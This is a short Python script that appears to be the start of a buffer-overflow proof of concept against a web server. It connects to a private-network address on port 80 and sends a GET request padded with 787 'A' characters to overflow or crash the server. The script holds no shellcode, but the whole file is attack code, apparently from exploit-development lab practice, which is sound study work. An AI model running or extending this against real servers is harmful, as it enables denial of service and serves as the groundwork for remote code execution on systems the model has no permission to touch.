#!/usr/bin/python

import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.111.22", 80))

buffer = "GET "
buffer += "A" * 787
buffer += " HTTP/1.1\r\n\r\n"

sock.send(buffer)
sock.close()
